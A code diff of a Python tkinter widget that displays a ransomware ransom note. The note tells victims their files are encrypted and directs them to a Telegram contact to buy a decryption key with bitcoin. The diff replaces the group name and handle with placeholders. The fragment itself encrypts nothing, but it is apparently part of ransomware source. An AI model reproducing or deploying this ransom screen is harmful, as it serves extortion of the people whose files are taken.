@@ -123,13 +123,13 @@ class RoundedText(RoundedWidget):
         self.text.place(relwidth=1, relheight=1)
         msg =  f"""
 
-we are NKFM
+we are <hacker group>
 
 we have infected this device with ransomware
 your important files have been encrypted
 you will need to buy a key to decrypt your files
 
-contact @Layan_BHQ in the telegram app
+contact @<username> in the telegram app
 to negotiate a bitcoin payment for the key"""
         self.text.insert(tk.END, msg)
         self.text.tag_configure("center", justify='center')
